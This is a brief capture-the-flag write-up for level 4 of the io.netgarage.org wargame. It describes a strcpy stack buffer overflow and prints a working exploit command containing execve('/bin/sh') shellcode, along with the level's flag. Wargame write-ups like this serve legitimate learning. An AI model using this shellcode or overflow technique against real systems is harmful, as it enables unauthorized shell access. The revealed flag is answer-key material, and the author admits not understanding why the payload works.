### Level 04  
Let's get a copy of the stuff  
`scp -P 2264 level4@io.netgarage.org:/levels/level04* .` with password from previous level  
  
Looking through source, we use strcpy to copy however many bytes we want into a buffer. We overwrite a few things and then I think we eventually overwrite the return address at some point  
  
Using pwndbg (and argv[1] = "X"*24+"ABC"), it looks like we overwrite at ABC to jump somewhere.  
  
We can jump to our buffer! 0x600477  
  
I tried about 3 different variants on 24 byte shellcode and then came across a 23 byte version [here](https://www.exploit-db.com/exploits/36858/) which let me follow a suggestion from [here](https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/) which is to take a sane value from the stack as the stack pointer.  
  
`./level04 $(python -c 'print ("\x5c\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05\x77\x04\x60")')` I have no idea why it works, but I tried all the 1 byte instructions before and after the shellcode and that worked.  
  
Flag is `IpzNGTYQOK5bh3xC`  
